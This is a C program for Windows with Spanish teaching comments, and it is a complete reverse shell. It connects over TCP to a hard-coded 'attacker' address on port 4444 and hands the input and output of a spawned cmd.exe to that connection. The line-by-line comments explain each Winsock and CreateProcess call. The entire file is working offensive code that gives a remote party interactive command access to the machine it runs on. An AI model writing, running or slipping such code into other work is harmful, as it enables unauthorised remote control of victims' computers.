#include <winsock2.h> // gcc -lws2_32 vinculo con la biblioteca winsock2

//variables globales
WSADATA socketDate;
SOCKET mainSocket;
struct sockaddr_in connectionAddress;
STARTUPINFO s_i;
PROCESS_INFORMATION p_i;

int main() {
    const char *attackerIP = "192.168.18.203";
    short int attackerPORT = 4444;
    //inicio de la bibilioteca sock
    WSAStartup(MAKEWORD(2, 2), &socketDate);
    // creacion del socket
    mainSocket = WSASocket(
        AF_INET, // familia ipv4
        SOCK_STREAM, // protocolo tcp para ipv4/6
        IPPROTO_TCP, // protocolo de transmision tcp
        NULL, // protocolo no personalizado, null para lo predeterminado de los 3 primeros argumentos
        (unsigned int)NULL, // null no tiene grupo
        (unsigned int)NULL // sin comportamientos especiales
    );

    //datos para el socket
    connectionAddress.sin_addr.s_addr = inet_addr(attackerIP); //direccion ip el cual se conectara
    connectionAddress.sin_port = htons(attackerPORT); // puerto al cual se conectara
    connectionAddress.sin_family = AF_INET; // ipv4

    //conexion hacia el atacante

    WSAConnect(
        mainSocket, // identificador del socket
        (SOCKADDR *)&connectionAddress, // puntero a la estructura de datos donde se va a conectar
        //importante el (SOCKADDR *) viene de typed struct sockaddr
        sizeof(connectionAddress), // tamaño en bytes de la estructura
        NULL, // no enviar datos, por lo general es null
        NULL, // no espera datos del serivdor
        NULL, // sin calidad de servicio (ancho de banda, prioridad, latencia) monitorea y controla (QOS) 
        NULL // calidad de servicio en grupo
    );

    //iniciamos todos los bytes en 0
    ZeroMemory(&s_i, sizeof(s_i)); // 0 por defecto
    // equivalente a: memset(&s_i, 0, sizeof(s_i)) -> mayor control, decides si poner 0

    //llenamos los datos de s_i (proceso)
    s_i.cb = sizeof(s_i); // tamaño de la estructura de bytes para que CreateProcess pueda saber cuanto debe leer
    s_i.dwFlags = STARTF_USESTDHANDLES; // flag que indica que i/o/e sera heredados, redirige
    //los dwFlags son para configurar el comportamiento, se usa en redes e I/O
    s_i.hStdInput = s_i.hStdOutput = s_i.hStdError = (HANDLE)mainSocket; // proceso padre, I/O/E lo manejara el mainSocket
    // herencia 

    // proceso hijo
    CreateProcess(
        NULL, // nombre del modulo a ejecutar, en este caso no hay
        "cmd.exe", //linea de comando a ejecutar
        NULL, // no tiene identificador de acceso
        NULL, // el hilo creado no tiene identificador
        TRUE, // envia los I/O/E al mainSocket
        0, // no hay flags de configuracion adicional
        NULL, // puntero a un bloque de entorno
        NULL, // puntero a una cadena que especifica el directorio de trabajo actual
        &s_i, // informacion de como debe iniciar el proceso
        &p_i // recibe informacion del proceso y su hilo
    );

    //limpieza
    closesocket(mainSocket); //cierra el socket
    WSACleanup(); // limpia winsock

    return 0;
}